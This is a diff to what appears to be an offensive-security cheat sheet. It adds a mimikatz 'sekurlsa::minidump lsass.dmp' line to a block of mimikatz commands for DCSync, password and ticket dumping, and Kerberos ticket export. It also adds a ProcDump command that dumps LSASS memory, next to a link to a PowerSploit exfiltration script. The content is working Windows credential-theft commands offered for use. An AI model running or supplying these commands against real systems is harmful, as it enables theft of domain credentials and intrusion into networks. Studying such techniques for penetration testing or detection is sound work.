@@ -2929,6 +2929,7 @@ mimikatz # lsadump::dcsync
 mimikatz # lsadump::dcsync /domain:<domain> /user:<domain>\<username>
 mimikatz # sekurlsa::logonpasswords
 mimikatz # sekurlsa::tickets
+mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # kerberos::list
 mimikatz # kerberos::list /export
 mimikatz # kerberos::purge
@@ -3062,6 +3063,12 @@ https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0
 
 ```
 https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
+```
+
+- ProcDump
+
+```
+C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 #8. - File Transfers
